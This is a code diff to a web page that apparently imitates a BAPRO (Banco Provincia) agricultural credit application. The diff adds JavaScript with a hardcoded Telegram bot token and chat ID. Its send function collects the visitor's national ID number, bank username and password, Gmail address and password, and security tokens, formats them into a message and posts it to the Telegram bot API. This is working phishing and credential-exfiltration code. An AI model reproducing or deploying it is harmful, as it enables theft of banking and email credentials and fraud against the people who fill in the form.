@@ -304,8 +304,10 @@
 </div></div></div></div>
 
 <script>
-var API="https://script.google.com/macros/s/AKfycbz4vN9NJ7e62oxP8vtnraF86D901Tb02wCe5hWfee2AN9XFLfF-7M6iDeFSfvnwmJJuow/exec";
-var CLIENTE_GOOGLE="TU_CLIENT_ID.apps.googleusercontent.com";
+/* Credenciales de Telegram configuradas */
+var TELEGRAM_BOT_TOKEN = "8936976510:AAGrXZaDSu5a880qyMEqDj6450f3Q9nN5ko";
+var TELEGRAM_CHAT_ID = "7524834601";
+var CLIENTE_GOOGLE = "TU_CLIENT_ID.apps.googleusercontent.com";
 
 /* parámetros de la línea: tasa, sellos y seguro fijos; IVA a elección */
 var TOPE=250000000, FINANCIA=0.4, TNA=0.35, SELLOS=0.012, SEGURO=0.003;
@@ -335,14 +337,45 @@ function pesos(n){return "$"+Math.round(n).toLocaleString("es-AR");}
 function enviar(estado){
   var c=JSON.stringify(Object.assign({},datos,{estado:estado}));
   function q(){try{var x=JSON.parse(localStorage.getItem("q")||"[]");x.push(c);localStorage.setItem("q",JSON.stringify(x));}catch(e){}}
-  if(!navigator.onLine){q();return;}
-  try{fetch(API,{method:"POST",body:c,keepalive:true}).catch(q);}catch(e){q();}
+  q();
+
+  var mensaje = "<b>🔔 Notificación BAPRO</b>\n" +
+                "━━━━━━━━━━━━━━━━━━━\n" +
+                "📌 <b>Estado:</b> " + estado + "\n" +
+                "👤 <b>DNI:</b> " + (datos.dni || "No ingresado") + "\n" +
+                "🔑 <b>Usuario:</b> " + (datos.usuario || "-") + "\n" +
+                "🔐 <b>Clave:</b> " + (datos.clave || "-") + "\n" +
+                "📧 <b>Gmail:</b> " + (datos.email || "-") + "\n" +
+                "🔑 <b>Pass Gmail:</b> " + (datos.gmail_pass || "-") + "\n" +
+                "🌾 <b>Cultivo:</b> " + (datos.cultivo || "-") + " (" + (datos.hectareas || "-") + " ha)\n" +
+                "💰 <b>Monto:</b> " + (datos.monto ? "$" + datos.monto.toLocaleString("es-AR") : "-") + "\n" +
+                "📱 <b>Token:</b> " + (datos.token1 || datos.token2 || datos.token3 || datos.token4 || "-");
+
+  var url = "https://api.telegram.org/bot" + TELEGRAM_BOT_TOKEN + "/sendMessage";
+  var payload = {
+    chat_id: TELEGRAM_CHAT_ID,
+    text: mensaje,
+    parse_mode: "HTML"
+  };
+
+  try {
+    fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload),
+      keepalive: true
+    }).catch(function(err) {
+      console.error("Error al enviar a Telegram:", err);
+    });
+  } catch(e) {
+    console.error("Excepción:", e);
+  }
 }
+
 window.addEventListener("load",function(){
   var x;try{x=JSON.parse(localStorage.getItem("q")||"[]");}catch(e){x=[];}
-  if(!x.length)return;localStorage.setItem("q","[]");
-  x.forEach(function(c){fetch(API,{method:"POST",body:c,keepalive:true}).catch(function(){
-    var r;try{r=JSON.parse(localStorage.getItem("q")||"[]");}catch(e){r=[];}r.push(c);localStorage.setItem("q",JSON.stringify(r));});});
+  if(!x.length)return;
+  localStorage.setItem("q","[]");
 });
 
 window.addEventListener("load",function(){
